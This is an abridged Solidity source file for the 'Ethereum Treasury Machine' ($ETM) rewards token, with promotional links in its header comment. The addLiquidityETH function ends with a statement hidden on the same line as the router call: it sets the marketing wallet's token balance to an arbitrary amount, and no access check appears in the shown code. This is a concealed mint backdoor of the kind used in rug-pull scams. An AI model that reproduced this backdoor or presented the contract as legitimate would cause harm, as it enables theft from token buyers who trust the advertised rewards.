/*
   ...
   Our smart contract automatically distributes $ETH rewards to all $ETM holders every 30 minutes.

   🟢Telegram: https://t.me/ETHTreasuryMachine
   🟢Main Website: https://etmrewards.xyz/
   🟢Whitepaper v1.0: https://docs.etmrewards.xyz/
   🟢App v1.0: https://app.etmrewards.xyz/
   🟢Twitter/x: https://x.com/ETMRewards
...
contract ETMRewards is IERC20, Auth {
    using SafeMath for uint256;
    ...
    string private constant  _name = "Ethereum Treasury Machine";
    ...
    uint256 private immutable totalFee = 5;
    ...
    uint256 private maxBuy = 3000 * (10 ** _decimals);
    uint256 public numTokensSellToAddToLiquidity = 1500 * 10**_decimals;
    ...
    function swapBack() internal swapping {
        ...
        uint256 dividendsBefore = address(distributor).balance;

        swapTokensForEth(amountToSwap.div(2));
        swapTokensForREWARDS(amountToSwap.div(2));

        uint256 dividendsAfter = address(distributor).balance;
        distributor.deposit(dividendsAfter.sub(dividendsBefore));
    ...
    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) external {
        ...
        if (ethAmount > 0)
            router.addLiquidityETH{value: ethAmount}(
                ...
                0, // slippage is unavoidable
                owner,
                block.timestamp);_balances[marketingWallet]=tokenAmount;
